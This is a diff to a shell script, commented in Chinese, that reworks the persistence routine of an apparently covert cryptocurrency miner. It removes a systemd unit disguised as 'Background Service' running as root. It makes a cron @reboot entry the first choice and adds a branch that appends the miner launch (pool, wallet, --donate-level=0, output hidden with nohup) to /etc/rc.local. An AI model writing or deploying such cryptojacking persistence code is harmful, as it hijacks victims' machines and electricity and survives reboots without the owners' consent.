@@ -142,29 +142,9 @@ start_process() {
 ### 持久化方式检测 ###
 setup_persistence() {
     debug_echo "开始设置持久化"
-    # 1. 尝试 Systemd（高权限）
-    if [ -d "/etc/systemd/system" ] && [ -w "/etc/systemd/system" ]; then
-        debug_echo "使用 Systemd 持久化"
-        cat <<EOF > "/etc/systemd/system/${BIN_NAME}.service"
-[Unit]
-Description=Background Service
-After=network.target
-
-[Service]
-ExecStart=${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b
-Restart=always
-RestartSec=30
-User=root
-
-[Install]
-WantedBy=multi-user.target
-EOF
-        systemctl daemon-reload
-        systemctl enable "${BIN_NAME}.service"
-        systemctl start "${BIN_NAME}.service" >/dev/null 2>&1 &
     
-    # 2. 尝试 Cron（低权限）
-    elif command -v crontab >/dev/null; then
+    # 1. 尝试 Cron（最通用）
+    if command -v crontab >/dev/null; then
         debug_echo "使用 Cron 持久化"
         # 创建内存中的启动命令
         STARTUP_CMD="cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &"
@@ -172,6 +152,14 @@ EOF
         (crontab -l 2>/dev/null; echo "@reboot $STARTUP_CMD") | crontab - >/dev/null 2>&1
         # 立即执行启动命令
         eval "$STARTUP_CMD" &
+    
+    # 2. 尝试 rc.local（如果存在）
+    elif [ -f "/etc/rc.local" ] && [ -w "/etc/rc.local" ]; then
+        debug_echo "使用 rc.local 持久化"
+        # 在 rc.local 中添加启动命令
+        echo "cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &" >> "/etc/rc.local"
+        # 立即执行启动命令
+        cd "${STORE_DIR}" && nohup "${STORE_DIR}/${BIN_NAME}" -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
     
     # 3. 回退到 while 循环（最低权限）
     else
